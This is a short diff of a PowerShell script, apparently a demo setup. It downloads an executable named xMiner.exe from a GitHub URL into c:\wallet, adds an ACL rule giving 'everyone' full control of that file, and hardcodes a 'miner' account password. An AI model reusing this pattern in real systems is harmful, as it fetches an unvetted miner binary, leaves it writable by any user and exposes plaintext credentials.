@@ -27,6 +27,14 @@ $miner = "https://raw.githubusercontent.com/tmmdemo/automate/master/xMiner.exe"
 $DEST = "c:\wallet\xMiner.exe"
 $web = New-Object -TypeName System.Net.WebClient
 $web.DownloadFile($miner,$DEST)
+
+
+$Acl = Get-ACL $DEST
+$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule("everyone","FullControl","ContainerInherit,Objectinherit","none","Allow")
+$Acl.AddAccessRule($AccessRule)
+Set-Acl $DEST $Acl
+
+
 $username = 'miner'
 $password = 'Mining4Ever!'
 
